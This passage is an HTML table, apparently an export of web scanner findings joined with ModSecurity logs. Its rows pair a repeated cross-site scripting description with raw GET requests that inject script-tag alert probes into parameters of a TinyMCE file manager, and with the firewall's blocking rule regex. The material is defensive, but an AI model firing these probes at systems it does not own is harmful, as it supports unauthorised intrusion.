&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551ac26aa50f8</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8='&gt;&lt;script&gt;alert(976099)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=v5ib933eo4ndh2hnrk2n93iu85
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:30</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:28 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551ac26aa50f8. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(976099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts5KwQAW0AAHhB77cAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts5KwQAW0AAHhB77cAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366872</td><td class=xl24 width=64 >2015-03-31 21:12:14</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(203299)&lt;/script&gt;&lt;!--&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=bffsea5r8m6ag299mlqq8e0g67
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:31</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:30 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(203299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts5qwQAW0AAD9hYN8AAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts5qwQAW0AAD9hYN8AAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366876</td><td class=xl24 width=64 >2015-03-31 21:22:52</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_0</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=&lt;script&gt;prompt(148799)&lt;/script/&gt;&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=l4338582r67j2j3vo24ar3ngt3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:32</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:31 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_0. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(148799)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts56wQAW0AABt@bV4AAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts56wQAW0AABt@bV4AAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366877</td><td class=xl24 width=64 >2015-03-31 21:23:29</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(720399)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=ucmoql2engplaedm1k4rovk345
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:33</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:32 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(720399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts6KwQAW0AAHchlVYAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts6KwQAW0AAHchlVYAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366878</td><td class=xl24 width=64 >2015-03-31 21:27:30</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(570699)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=2f96etra19c5n5j2ku9h0hj7g6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:35</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:33 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(570699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts6awQAW0AAHgzv0gAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts6awQAW0AAHgzv0gAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366879</td><td class=xl24 width=64 >2015-03-31 21:28:04</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey='&gt;&lt;script&gt;alert(194299)&lt;/script&gt;&lt;!--&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=d33qushgs9i2lc31tqbsluqvm7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:36</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:35 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(194299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts66wQAW0AAB7zKNUAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts66wQAW0AAB7zKNUAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366880</td><td class=xl24 width=64 >2015-03-31 21:29:15</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(964299)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=eo5prsrkp925bkl9dsmhg4rgj7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:37</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:36 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(964299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts7KwQAW0AAHhGMt4AAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts7KwQAW0AAHhGMt4AAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366881</td><td class=xl24 width=64 >2015-03-31 21:29:48</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(215099)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=8ch38nn6s561ff3ctj34nrfot2
Connection: Close

